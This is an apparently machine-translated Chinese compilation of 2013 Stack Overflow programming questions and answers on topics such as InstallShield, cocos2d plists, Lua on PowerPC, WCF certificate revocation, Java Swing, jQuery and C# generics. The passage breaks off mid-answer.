我的第一个问题是您为什么要编写自定义操作？InstallShield 的内置自定义操作（XML 文件更改）已经能够在卸载时删除元素。我的第二个观察是 InstallScript 作为一种语言是可靠的，它缺乏对如何正确设计往往会导致问题的自定义操作的理解。我害怕：

[Windows Installer 中自定义操作的安装阶段和脚本内执行选项](http://www.installsite.org/pages/en/isnews/200108/)

请务必在 InstallInitialize 和 InstallFinalize 之间的系统上下文中将所有修改系统的自定义操作安排为延迟。还要确保使用 CustomActionData 模式并在卸载被取消或失败时进行相应的回滚操作。否则，您可能会遇到应用程序已安装但标签丢失的情况。

当然，永远不要在已经存在的地方重新发明轮子。(XMLFileChanges) 它很少顺利。

# cocos2d-iphone - cocos2d中如何编写plist文件将数据从一层传输到另一层

> ID：15738375
> 
> 赞同：0
> 
> 时间：2013-04-01T05:56:25.607
> 
> 标签：cocos2d-iphone, plist, box2d-iphone

```
-(void)writeToTopScorePlist<br>
{
   <br>
   NSError *error;<br>
   NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); //1<br>
   NSString *documentsDirectory = [paths objectAtIndex:0]; //2<br>
   NSString *path = [documentsDirectory stringByAppendingPathComponent:@"TopScore.plist"]; //3<br>
   NSFileManager *fileManager = [NSFileManager defaultManager];<br>
   if (![fileManager fileExistsAtPath: path]) //4<br>
   {<br>
          NSString *bundle = [[NSBundle mainBundle] pathForResource:@"TopScore" ofType:@"plist"]; //5<br>
          [fileManager copyItemAtPath:bundle toPath: path error:&error]; //6<br>
   }<br>
   NSMutableDictionary *data = [[NSMutableDictionary alloc] initWithContentsOfFile:path ];<br>
    [data setObject:[NSString stringWithFormat:@"%i",self.MyTopScore] forKey:@"TopScore"];<br>
    [data writeToFile:path atomically:YES];<br>
    [data release] ;<br>
   } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:01:00.610

使用 NSUserDefaults：

```
// Code used to save your highscore in the preference
int topscore  = yourGameScore;
[[NSUserDefaults standardUserDefaults] setObject:[NSNumber numberWithInt:topscore] forKey:@"topscore"];
[[NSUserDefaults standardUserDefaults] synchronize];

// Code used to get your saved value from the prefs.
topScore = [[[NSUserDefaults standardUserDefaults] objectForKey:@"topscore"] intValue ]; 
```

# c# - 如何为控件属性自动生成代码？

> ID：15738377
> 
> 赞同：0
> 
> 时间：2013-04-01T05:56:48.570
> 
> 标签：c#, winforms, controls

我有一个自定义控件，该控件有一个属性集合。

我想拖动我的控件，自动将对象添加到我的控件的集合属性中。

就像`TabControl.TabPages`自动代码一样。拖到`TabControl`表单时，自动创建 2`TabPage`添加`TabControl.TabPages`。

我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T08:00:18.863

您应该使用自定义设计器，例如 TabControl：

```
[Designer("System.Windows.Forms.Design.TabControlDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
...
public class TabControl : Control
{
    ....
} 
```

TabControlDesigner 提供这两个默认选项卡：

```
internal class TabControlDesigner : ParentControlDesigner
{
    public override void InitializeNewComponent(IDictionary defaultValues)
    {
        base.InitializeNewComponent(defaultValues);
        try
        {
            this.addingOnInitialize = true;
            this.OnAdd((object) this, EventArgs.Empty);
            this.OnAdd((object) this, EventArgs.Empty);
            ... 
```

# lua - Lua 在 PowerPC/LynxOS 平台上的行为很奇怪，为什么？

> ID：15738378
> 
> 赞同：7
> 
> 时间：2013-04-01T05:56:59.743
> 
> 标签：lua, powerpc, lynxos

我选择 Lua 5.1 作为我的应用程序的嵌入式脚本语言，但是当我将应用程序移植到在 PowerPC 上运行 LynxOS 的旧平台时，事情似乎出了问题。

我在 PC 上运行了以下代码，一切看起来都不错：

```
void test_lua()
{
  const char *code = "foo = 5\n";
  double vfoo=0;
  lua_State *L = luaL_newstate();

  (void)luaL_loadbuffer(L, code, strlen(code), "line");
  (void)lua_pcall (L, 0, 0, 0);

  lua_getglobal(L, "foo");
  vfoo = lua_tonumber(L, -1);

  lua_close(L);

  myTrace("vfoo = %f", vfoo);
  for(;;);
} 
```

使用 PC (Visual C++ 6.0) 我期待“vfoo = 5.000000”

但是使用 LynxOS/PowerPC 我得到了“vfoo = 0.000000”。

那么 LynxOS/PowerPC 上的 Lua 发生了什么？我想知道大端机器是否有一些配置，我在“luaconf.h”中寻找它，但什么也没找到。我也尝试了配置项“LUA_USE_POSIX”但没有帮助。

我知道这不是 lua 编程的典型平台。但是，欢迎提出任何建议并予以赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-24T08:39:14.010

字节序不应该影响 lua 代码的操作。我已经移植到几个不是 Win32 的平台，并且我遇到过用于将 64 位双精度转换为整数的 LUA_IEEE754TRICK 并不总是有效，但默认情况下已启用。尝试在 luaconf.h 中取消定义 LUA_IEEE754TRICK 宏。

我还遇到过浮点 printf/scanf 函数损坏或不可靠的 clib，我不得不编写自己的自定义版本的 lua_number2str。

不过我对你有感觉。lua 引擎是一个大而黑的盒子，当它的内部出现问题时，它会让人难以单步调试和调试。在我的情况下，这通常是编译器/clib 的错，但这并没有让两者更容易相处。

# wcf - 无法联系服务器以获取 WCF 相互 SSL 身份验证中的证书吊销列表 (CRL)

> ID：15738379
> 
> 赞同：2
> 
> 时间：2013-04-01T05:57:21.257
> 
> 标签：wcf, ssl, ssl-certificate

我正在尝试在 WCF 中构建一个应用程序，该应用程序将通过相互 SSL 身份验证工作。服务器端 SSL 证书工作正常，但是当服务尝试对客户端进行身份验证时，它无法读取 CRL。它显示以下消息 -

> **HTTP 错误 403.13 - 禁止，您的客户端证书已被吊销，或无法确定吊销状态**

但是据我所知，它可能发生在以下情况下 - 1\. 如果 CRL 服务器无法访问。2.如果IIS无法访问Internet。

但是 CRL 分发点地址是可达的，我可以通过在浏览器中复制粘贴地址来下载 CRL。并且 IIS 工作正常。

所以还有一些我不知道的其他问题。任何人都可以在这里帮助我解决这个问题。有没有办法从任何本地目录加载 CRL？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-06T19:01:21.397

（仅供参考）

尝试以下操作：运行 -> certutil -url [your_certificate_path]。检查 CRL（来自 CDP）。

这用于检查 CDP 是否真的可以访问...

如果中间和根证书颁发机构存在问题，请检查证书路径

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-06-17T12:51:03.957

您的 CRL 也可能已过时。字段 nextUpdate 是过去的。

# java - 将文本文件中的每个单词提取到java中的文本字段中

> ID：15738384
> 
> 赞同：0
> 
> 时间：2013-04-01T05:57:45.753
> 
> 标签：java

我正在尝试将存储在文本文件中的一组单词一个接一个地提取到一个文本字段中，即在我的表单中我有一个文本字段和一个按钮，当我单击按钮时，文本文件中存在的单词必须显示在文本字段中，当我再次单击按钮时，文本文件中的第二个单词必须显示在文本字段中，依此类推。我能够编写一个程序来获取一个单词，但不能在循环中。请指导我解决这个问题。提前致谢。

```
//textview.java  

import java.util.Scanner;  
import java.io.*;  
public class textview   
{  
Scanner scan;  
static String name;   
public void Open()  
{  
try  
{  
scan =new Scanner(new File("F:/MajorProject-NLP/Databases/DataFiles/split.txt")); 
}  
catch(FileNotFoundException e)  
{  
    System.out.println("It wont working");  
}  
}  
public void Read()  
{  
    do  
    {  
       name=scan.next();  

     }  
       while(scan.hasNext());  
       System.out.println(name);  
       scan.close();  
 }  
}  

  // this is my another file where the fetch button is placed.

 import javax.swing.*;
 import java.awt.*;
 import java.io.BufferedWriter;
 import java.io.FileWriter;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;

 class ReadTextFile extends JFrame
 {
  public static String N;
  private static final long serialVersionUID = 1L;
  JButton save,fetch;
  JPanel panel;
  JLabel label1,label2,label3,label4,label5;
  final JTextField text1,text2,text3,text4,text5;

  ReadTextFile(){
  label1 = new JLabel();
  label1.setText("English Word:");
  text1 = new JTextField(20);

  label2 = new JLabel();
  label2.setText("English Synonym:");
  text2 = new JTextField(20);

  label3 = new JLabel();
  label3.setText("Kannada Word:");
  text3 = new JTextField(20);

  label4 = new JLabel();
  label4.setText("Kannada Synonym:");
  text4 = new JTextField(20);

  label5 = new JLabel();
  label5.setText("Parts of Speech:");
  text5 = new JTextField(20);

  save=new JButton("SAVE");
  fetch=new JButton("NEXT");

  panel=new JPanel(new GridLayout(6,2));
  panel.add(label1);
  panel.add(text1);
  panel.add(label2);
  panel.add(text2);
  panel.add(label3);
  panel.add(text3);
  panel.add(label4);
  panel.add(text4);
  panel.add(label5);
  panel.add(text5);
  panel.add(save);
  panel.add(fetch);
  add(panel,BorderLayout.CENTER);
  setTitle("Word Base");

  save.addActionListener(new ActionListener() {
  public void actionPerformed(ActionEvent ae){
  String value1=text1.getText();
  String value2=text2.getText();
  String value3=text3.getText();
  String value4=text4.getText();
  String value5=text5.getText();
  try
  {
    FileWriter fstream = new FileWriter("F:/MajorProject-NLP/Databases/DataFiles/pos.txt",true);
        BufferedWriter out = new BufferedWriter(fstream);
    out.write(" ");
    out.write(value1);
        out.write(" ");
    out.write(value2);
    out.write(" ");
    out.write(value3);
    out.write(" ");
    out.write(value4);
    out.write(" ");
    out.write(value5);
    out.write(" ");
    out.write("\n");
    out.close();
  }
  catch(Exception e)
  {
    System.err.println("Error"+e.getMessage());
  }
  text1.setText("");
  text2.setText("");
  text3.setText("");
  text4.setText("");
  text5.setText("");
 }

 });

 fetch.addActionListener(new ActionListener() {
     public void actionPerformed(ActionEvent ae){
          if(ae.getSource()==fetch)
          { 
            text1.setText(N);
              }
  });
  }
  public static void main(String arg[]) 
  {
   try
  {
     ReadTextFile frame=new ReadTextFile();
     frame.setSize(300,200);
     frame.setVisible(true);
     textview tv=new textview();
     tv.Open();
     tv.Read();
     N=textview.name;
  }
   catch(Exception e)
   {}
 }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:05:14.613

```
do{  
   name=scan.next();  

 } while(scan.hasNext());  
   System.out.println(name); 
```

应该

```
do{  
   name=scan.next();  
   System.out.println(name); 
 }while(scan.hasNext()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:15:25.820

您可以通过将所有单词存储到 arraylist 对象中来实现这一点，然后根据按钮单击将其作为 prev/next 移动。当您阅读时，请继续进行小型实施

**更新方法**

```
public List<String> Read(){
    //initialize 
    List<String> words = new ArrayList<String>();

    do{  
       name=scan.next();
       // now store all the words into the words object
       words.add(name);
    } while(scan.hasNext());
    return words;
} 
```

这将从文件中读取所有单词并存储到`words`对象中。现在单击按钮只需通过传递具有增量值的索引来移动下一步

```
int wordIndex = -1;

fetch.addActionListener(new ActionListener() {  
       public void actionPerformed(ActionEvent ae){  
           if(words.size>0 && wordIndex<words.size()){
               wordIndex++;
               String word = words.get(wordIndex);
               text1.setText(N);  
            }
       }  
  }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:25:51.070

试试这个，它在我的机器上工作......

```
public void Open()
{  
    try  
    {  
        scan =new Scanner(new File("C:/temp.txt")); 
        flag=true;
    }  
    catch(FileNotFoundException e)  
    {  
        flag=false;
        System.out.println("It wont working");  
    }
}  
public String Read()  
{   
    if(flag)
        name=scan.next();
    else
        return "End of the file";

    System.out.println(name); 
    if(!scan.hasNext())
    {
        scan.close();
        flag=false;
    }
    return name;
}  
@Override
public void actionPerformed(ActionEvent e) 
{
    if(e.getSource()==fetch)
    {  
        text1.setText(Read());  
    }
} 
```

**更新1**

如果您想为按钮使用另一个类，请尝试以下代码：

`textview`类的创建和对象

```
textview tv = new textview(); 
```

调用 Open() 方法：

```
tv.Open(); 
```

并获得下一个文本使用：

```
text1.setText(tv.Read()); 
```

**更新2**

```
public class textview extends JFrame implements ActionListener
{  
Scanner scan;  
static String name;
JButton fetch;
JTextField text1;
testview2 t2 = new testview2();

public static void main(String args[])
{
new textview();
}
public textview()
{
setLayout(new FlowLayout());
setSize(200, 200);
fetch = new JButton("FetchData");
text1 = new JTextField(20);
add(fetch);
fetch.addActionListener(this);
add(text1);
setVisible(true);
t2.Open();
}
@Override
public void actionPerformed(ActionEvent e) 
{
if(e.getSource()==fetch)
    {  
       text1.setText(t2.Read());  
    } 
}
}

class testview2 {
Scanner scan;
static String name;
boolean flag=false;
public void Open()  
{  
    try  
    {  
        scan =new Scanner(new File("C:/temp.txt")); 
        flag=true;
    }  
    catch(FileNotFoundException e)  
    {  
        flag=false;
        System.out.println("It wont working");  
    }
}  
public String Read()  
{   
    if(flag)
        name=scan.next();
    else
        return "End of the file";

    System.out.println(name); 
    if(!scan.hasNext())
    {
        scan.close();
        flag=false;
    }
    return name;
}
} 
```

# html - 如何在 jquery 中的最后一个 div 内容之后隐藏下一个按钮

> ID：15738390
> 
> 赞同：1
> 
> 时间：2013-04-01T05:58:20.817
> 
> 标签：html, ajax, jquery

我想要做的是加载页面，然后只显示下一个按钮，在我单击下一个之后，然后显示上一个和下一个按钮，然后继续浏览不同的 div，在你到达最后一个 div , 隐藏下一个按钮，只显示上一个按钮。

Jquery表单滑块脚本

```
<script>
$(document).ready(function () {
    var oldOption;
    var currentOption;
    var counter = 1;
    var maxThings = 4;
    $("#2").hide();
    $("#3").hide();
    $("#4").hide();
    $("#forward").click(function () {
        $("#1").hide();
        $("#2").hide();
        $("#3").hide();
        $("#4").hide();
        if (!(counter >= maxThings)) {
            counter++;
        }
        $("#" + counter).show();
    });

    $("#back").click(function () {
        $("#1").hide();
        $("#2").hide();
        $("#3").hide();
        $("#4").hide();
        if (!(counter <= 1)) {
            counter--;
        }
        $("#" + counter).show();
    });
});
</script> 
```

计算脚本

```
<script>
function calculate() {
    var total = (parseInt($('#studenttut option:selected').val()) + parseInt($('#campusrb>option:selected').val())) * parseInt($('#yearsatten>option:selected').val());
    $("#total").text(total);
}
</script> 
```

HTML

```
<form>
<div id="1">
<table width="100%">
<tr>
    <td>Are you an In-State-Student?</td>
    <td align="right">
        <select id="studenttut">
            <option value="<?php echo $NIST; ?>">Yes $<?php echo $IST;  ?></option>
            <option value="<?php echo $NOST; ?>">No $<?php echo $OST; ?></option>
        </select>
    </td>
</tr>
</table>
</div>

<div id="2">
<table width="100%">
<tr>
    <td>Are you staying on campus?</td>
    <td align="right">
        <select id="campusrb">
            <option value="<?php echo $NBS; ?>">Yes $<?php echo $BS; ?>  </option>
            <option value="1">No $0</option>
        </select>
    </td>
</tr>
</table>
</div>

<div id="3">
<table width="100%">
<tr>
    <td>How many years are you planning to attend?</td>
    <td align="right">
        <select id="yearsatten">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="2">3</option>
            <option value="3">3</option>
            <option value="4">4</option>
            <option value="5">5</option>
            <option value="6">6</option>
            <option value="7">7</option>
            <option value="8">8</option>
        </select>
    </td>
</tr>
</table>
</div>

<div id="4">
<div id="total"><input type="button" onClick="calculate()" value="calculate"/></div>
</form>

</div>
<button id="back">Back</button>
<button id="forward">Next</button> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:05:21.923

您要做的是单击`#forward`，显示`'#back'`和隐藏`#forward`if `counter === maxThings`。单击`#back`时，显示`'#forward'`和隐藏`'#back'`if `counter === minThings`。

[jsFiddle](http://jsfiddle.net/Tyriar/TZyVx/)

```
$(document).ready(function () {
    var oldOption;
    var counter = 1;
    var maxThings = 4;
    var minThings = 1;
    $("#2").hide();
    $("#3").hide();
    $("#4").hide();
    $('#back').hide();

    $("#forward").click(function () {
        $("#1").hide();
        $("#2").hide();
        $("#3").hide();
        $("#4").hide();
        if (!(counter >= maxThings)) {
            counter++;
        }
        $("#" + counter).show();
        $('#back').show();
        if (counter === maxThings) {
            $('#forward').hide();
        }
    });

    $("#back").click(function () {
        $("#1").hide();
        $("#2").hide();
        $("#3").hide();
        $("#4").hide();
        if (!(counter <= 1)) {
            counter--;
        }
        $("#" + counter).show();
        $('#forward').show();
        if (counter === minThings) {
            $('#back').hide();
        }
    });
});

function calculate() {
    var total = (parseInt($('#studenttut option:selected').val()) + parseInt($('#campusrb>option:selected').val())) * parseInt($('#yearsatten>option:selected').val());
    $("#total").text(total);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:17:00.837

您应该在第一页或最后一页处理后退和前进按钮的可见性

像

```
if(counter==maxThings){
        $("#forward").hide();
    } 
```

和

```
if(counter==1){
        $("#back").hide();
    } 
```

也许像[http://jsfiddle.net/UFCeX/](http://jsfiddle.net/UFCeX/)

希望这有帮助

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:18:56.770

你可以试试这个：

```
$("#forward, #back").hide(); //<--hides both buttons

if($('form').find('div').first().is(':visible')){ //<---check the first of the div is visible
  $("#forward").show(); //<----if true then show the forward button
  $("#forward").click(function () {
     $("#back").show(); //<-----on click of the forward btn show the back button
     $("#1").hide();
     $("#2").hide();
     $("#3").hide();
     $("#4").hide();
     if (!(counter >= maxThings)) {
        counter++;
     }
     $("#" + counter).show();
     if($('form').find('div').last().is(':visible')){ //<---if last div in the form is visible then
       $(this).hide(); //<---hide the forward button
     }
  });
}
if($('form').find('div').last().is(':visible')){ //<---check the last of the div is visible
  $("#back").click(function () {
     $("#1").hide();
     $("#2").hide();
     $("#3").hide();
     $("#4").hide();
    if (!(counter <= 1)) {
        counter--;
    }
    $("#" + counter).show();
    if($('form').find('div').first().is(':visible')){ //<--if first div is visible then
       $(this).hide(); //<----hide the back button
    }
}); 
```

# c - 在其他结构中重新分配数组结构

> ID：15738396
> 
> 赞同：0
> 
> 时间：2013-04-01T05:59:11.117
> 
> 标签：c, arrays, pointers, struct, realloc

当我调用 realloc() 时，我的问题就在这条线上，但适用于第一个“Elemento”#include #include using namespace std;

```
typedef struct{
   string palabra;
   string* significados;
   size_t tam;
} Elemento;

typedef struct{
   Elemento* elementos;
   size_t tam;
} Diccionario;

Diccionario crearDic(){
   Diccionario dic;
   dic.tam = 0;
   return dic;
}

void agregarPalabraDic(Diccionario &dic, string pal, string sig){   
   dic.elementos = (Elemento*)realloc(dic.elementos,(dic.tam+1)*sizeof(Elemento));
   dic.tam++;

   dic.elementos[dic.tam-1].palabra = pal;   
   dic.elementos[dic.tam-1].significados = (string*)malloc(sizeof(string));    
   dic.elementos[dic.tam-1].tam = 1; 
   dic.elementos[dic.tam-1].significados[0] = sig; 
} 
```

这是 main() ：

```
int main(){
   Diccionario dic = crearDic();
   agregarPalabraDic(dic,"apple","red"); //no problem here
   agregarPalabraDic(dic,"banana","yellow"); //thats the problem
   ...
} 
```

我有好几天都在尝试，但什么都没有，我需要一些帮助.. ty

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:03:05.900

您的问题的根源是手动内存管理。因为这是 C++，所以你不需要做所有这些。最好的解决方案是更换：

```
typedef struct
{
   std::string palabra;
   std::string* significados;
   size_t tam;
} Elemento;

typedef struct
{
   Elemento* elementos;
   size_t tam;
} Diccionario; 
```

和：

```
typedef struct
{
   std::string palabra;
   std::vector<string>significados;
   size_t tam;
} Elemento;

typedef struct
{
   std::vector<Elemento> elementos;
   size_t tam;
} Diccionario; 
```

一旦你这样做了，你的程序应该会更容易，更不容易出错。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:15:33.200

在这段代码中

```
Diccionario crearDic(){
   Diccionario dic;
   dic.tam = 0;
   return dic;
} 
```

你为什么要返回在堆栈上创建的 dic。您应该在堆上创建它然后返回。

否则该对象将在超出范围时被销毁。

# c# - 导出为 PDF 没有记录

> ID：15738400
> 
> 赞同：1
> 
> 时间：2013-04-01T05:59:31.800
> 
> 标签：c#, asp.net, export-to-pdf

这是来自钦奈的阿伦。我正在做一个将数据从 Gridview 导出到 PDF 的项目。一切都很好，每当我单击 PDF 图像时都会打开一个新的 pdf 文档，但其中没有显示任何记录。

我在 Gridview 中有 15 条记录，这些记录已使用表适配器显示。我在 Gridview 中使用了沙色和天空自动格式化选项，颜色、表格单元格宽度、15 行在没有文本的情况下完美地显示在 PDF 中。

请指导我我错过了什么。

谢谢你。

```
using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.IO;
using System.Text;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Xml.Linq;
using Export2PDF.DAL.DataSet1TableAdapters;
using iTextSharp.text;
using iTextSharp.text.html;
using iTextSharp.text.html.simpleparser;
using iTextSharp.text.pdf;

namespace Export2PDF
{
    public partial class _Default : System.Web.UI.Page
    {

        DataTable1TableAdapter ds1 = new DataTable1TableAdapter();

        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void ShowGridView(object sender, EventArgs e)
        {
            Bindgrid();
        }

        public void Bindgrid()
        {
            gv1.DataSource = ds1.BatchStatusByBatches(Convert.ToDateTime(TextBox1.Text), Label1.Text);
            gv1.DataBind();
        }

        protected void gv1_PageIndexChanging(object sender, GridViewPageEventArgs e)
        {
            gv1.PageIndex = e.NewPageIndex;
            Bindgrid();
        }

        public override void VerifyRenderingInServerForm(Control control)
        {

        }

        protected void PDFExportButton_Click(object sender, EventArgs e)
        {
            Response.Clear();
            Response.Buffer = true;
            Response.ContentType = "application/pdf";
            Response.AddHeader("content-disposition", "attachment;filename=ExportToPDF.pdf");
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            StringWriter sw = new StringWriter();
            HtmlTextWriter hw = new HtmlTextWriter(sw);
            gv1.AllowPaging = false;
            gv1.DataSource = ds1.BatchStatusByBatches(Convert.ToDateTime(TextBox1.Text), Label1.Text);
            gv1.DataBind();
            gv1.RenderControl(hw);
            gv1.HeaderRow.Style.Add("width", "15%");
            gv1.HeaderRow.Style.Add("font-size", "10px");
            gv1.Style.Add("text-decoration", "none");
            gv1.Style.Add("font-family", "Arial, Helvetica, sans-serif;");
            gv1.Style.Add("font-size", "8px");
            StringReader sr = new StringReader(sw.ToString());
            Document pdfDoc = new Document(PageSize.A4, 10f, 10f, 10f, 0f);
            HTMLWorker htmlparser = new HTMLWorker(pdfDoc);
            PdfWriter.GetInstance(pdfDoc, Response.OutputStream);
            pdfDoc.Open();
            htmlparser.Parse(sr);
            pdfDoc.Close();
            Response.Write(pdfDoc);
            Response.End();
            Response.Clear();
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:41:49.170

尝试将以下内容添加到您的表单中：

```
public override void VerifyRenderingInServerForm(Control control)
{
   // Confirms that an HtmlForm control is rendered for the
   // specified ASP.NET server control at run time.
   // No code required here.
} 
```

来源：[http ://forums.asp.net/t/1047688.aspx/1](http://forums.asp.net/t/1047688.aspx/1)

# gwt - 在 GWT 应用程序中比较客户端的 POJO

> ID：15738403
> 
> 赞同：1
> 
> 时间：2013-04-01T05:59:36.307
> 
> 标签：gwt, comparison, client-side, pojo

我有一些显示在 GWT 表中的对象，用户可以在浏览器中对这些对象进行更改，当他们单击保存时，我希望能够生成更改摘要，即哪些字段已针对哪些对象进行了更改。

我想过使用 apache commons`CompareToBuilder`进行比较并使用一个库`reflection`来查找哪些字段已更改，但问题是我不能在 GWT 应用程序的客户端使用 commons，也不能使用反射。

有没有一种很好的方法可以在客户端执行此操作，而无需手动比较`compareTo`方法中的每个属性。我最好以通用方式执行此操作，以便它适用于任何 POJO。我不想在服务器端这样做，因为从语义上讲，在客户端这样做是有意义的，但是如果没有办法，那么我愿意这样做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:30:02.327

是的。您可以在客户端自行完成。

GWT Reflection 是一个小型框架，它使您能够在应用程序的客户端（是的！在浏览端！）使用反射 API。

[http://code.google.com/p/gwt-reflection/](http://code.google.com/p/gwt-reflection/)

希望有帮助（*如果您不想要任何第三方插件，请忽略*）。

还有一个类似的[问题](https://stackoverflow.com/questions/4195233/can-you-use-java-reflection-api-in-gwt-client)。

# c# - asp.net 文本子字符串取决于 div 的宽度

> ID：15738408
> 
> 赞同：0
> 
> 时间：2013-04-01T05:59:59.807
> 
> 标签：c#, asp.net, css

我有一个这种风格的 div

```
{padding:5px;width:240px;height:auto;float:left;text-align:left;} 
```

当我在这个 div 中写入文本字符串时，一个长文本被换行并输入一个新行。

![在此处输入图像描述](https://i.stack.imgur.com/HDNtd.jpg)

我想子字符串这个长文本取决于 div 的宽度（240px）。

![在此处输入图像描述](https://i.stack.imgur.com/zWCzJ.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:06:50.357

将此添加到 div 样式

```
 text-overflow:ellipsis; 
```

**注意：** `text-overflow: ellipsis` Internet Explorer 6 和 7、Safari 3 和 4、Chrome 1 和 2 支持属性，它需要对 IE 8 标准模式、Opera 和 FireFox 进行特殊处理。[有关更多浏览器支持，](http://mattsnider.com/css-string-truncation-with-ellipsis/)请参见此处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:06:11.947

您可以在显示类别菜单时在 c# 代码中使用 .Substring() 方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:06:18.970

您可以使用 css 属性 text-overflow=ellipsis 在浏览器中执行此操作

```
<ul>
 <li style="text-wrap:ellipsis">really really really really really really long</li>
</ul> 
```

# c# - 接口无法解析参数类型

> ID：15738411
> 
> 赞同：1
> 
> 时间：2013-04-01T06:00:33.420
> 
> 标签：c#

**我有以下课程：**

```
namespace CommonInterfaces
{
    public interface INode
    {
        int? ParentNodeId { get; set; }
        int? ChildNodeId { get; set; }
    }
}

public class FieldDependencyModel : DataModel<int>, ICacheable
{

    #region Field

    private int _FieldDependencyId;
    private int? _FieldId;
    private int? _FieldParentId;

    #endregion  

    #region Properties

    public virtual int FieldDependencyId
    {
        get { return getPropertyValue("FieldDependencyId",_FieldDependencyId); }
        set { _FieldDependencyId = value; }
    }

    public virtual int? ChildNodeId
    {
        get { return getPropertyValue("FieldId",_FieldId); }
        set { _FieldId = value; }
    }

    public virtual int? ParentNodeId
    {
        get { return getPropertyValue("FieldParentId",_FieldParentId); }
        set { _FieldParentId = value; }
    }

    #endregion
}

    public interface IFieldDependencyService
    {
        IList<FieldDependency> GetAllFieldDependencies();
    }

    public class FieldDependency : FieldDependencyModel, INode
    {
    }

    public class FieldDependencyDataService : BaseDataService, IFieldDependencyService
    {
        public FieldDependencyDataService(DataAccessHandle serviceHandler) : base(serviceHandler) {}

        public IList<FieldDependency> GetAllFieldDependencies()
        {
            return _accessService.loadAll<FieldDependency>();
        }
    }

    public class TreeService
    {
        private IList<INode> _relationships;
        private INode _rootNode;    

        public TreeService(INode rootNode, IList<INode> nodeRelationships)
        {
            _relationships = nodeRelationships;
            _rootNode = rootNode;
        }

        public Tree<INode> BuildTree()
        {
            Tree<INode> tree;

            tree = new Tree<INode>(_rootNode, _relationships);

            return tree;
        }
    } 
```

我尝试发送一个隐含 INode 的类型，**当**我尝试将 fieldDependencies 传递给新的 TreeService 实例时，它仍然显示以下错误：

```
Error   5   Argument 2: cannot convert from 'System.Collections.Generic.IList<FieldDependency>' to 'System.Collections.Generic.IList<CommonInterfaces.INode>' 
```

**这是我收到此错误的调​​用代码：**

```
 IList<FieldDependency> fieldDependencies = _service.GetAllFieldDependencies();

            FieldDependency rootDependency = fieldDependencies.First(d => d.ParentNodeId == null);
 var service = new TreeService(rootDependency, fieldDependencies); // fails here, doesn't like fieldDependencies 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:12:16.660

试试这个

```
IList<INode> fieldDependencies = _service.GetAllFieldDependencies()
.First(d => d.ParentNodeId == null).Select(d => (INode)d); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:13:23.297

您不能这样做，因为您正在尝试将 an 转换`IList<FieldDependency>`为 an `IList<INode>`，因此您尝试转换的实际对象是将`IList`相关类型作为其泛型类型的对象。您可以采取一些措施来解决这个问题。

## 替换`IList<FieldDependency>`为`IList<INode>`

您可以更改您的代码，使其`IList<FieldDependency>`成为`IList<INode>`.

```
public interface IDataFieldDependencyService
{
    IList<INode> GetAllFieldDependencies();
}

public class FieldDependencyDataService : BaseDataService, IFieldDependencyService
{
    public FieldDependencyDataService(DataAccessHandle serviceHandler) : base(serviceHandler) {}

    public IList<INode> GetAllFieldDependencies()
    {
        return _accessService.loadAll<FieldDependency>();
    }
} 
```

用法

```
IList<INode> fieldDependencies = _service.GetAllFieldDependencies();

INode rootDependency = fieldDependencies.First(d => d.ParentNodeId == null);
var service = new TreeService(rootDependency, fieldDependencies); 
```

* * *

## `Select`并转换为`INode`

您还可以从中选择所有元素`_service.GetAllFieldDependencies()`并将它们装箱`INode`。

```
IList<INode> fieldDependencies = _service.GetAllFieldDependencies()
    .Select(e => (INode)e)
    .ToList();

INode rootDependency = fieldDependencies.First(d => d.ParentNodeId == null);
var service = new TreeService(rootDependency, fieldDependencies); 
```

## 协方差

如果您使用s ，那么您可能可以[使用协方差](http://blogs.msdn.com/b/csharpfaq/archive/2010/02/16/covariance-and-contravariance-faq.aspx)（我相信.NET 4）`IEnumerable`做您想做的事情。

```
public class TreeService
{
    private IEnumerable<INode> _relationships;
    private INode _rootNode;    

    public TreeService(INode rootNode, IEnumerable<INode> nodeRelationships)
    {
        _relationships = nodeRelationships;
        _rootNode = rootNode;
    }

    public Tree<INode> BuildTree()
    {
        Tree<INode> tree;

        tree = new Tree<INode>(_rootNode, _relationships);

        return tree;
    }
} 
```

用法

```
IEnumerable<INode> fieldDependencies = _service.GetAllFieldDependencies();

INode rootDependency = fieldDependencies.First(d => d.ParentNodeId == null);
var service = new TreeService(rootDependency, fieldDependencies); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:15:20.450

您已将字段依赖项定义为 FieldDependency 列表，即

```
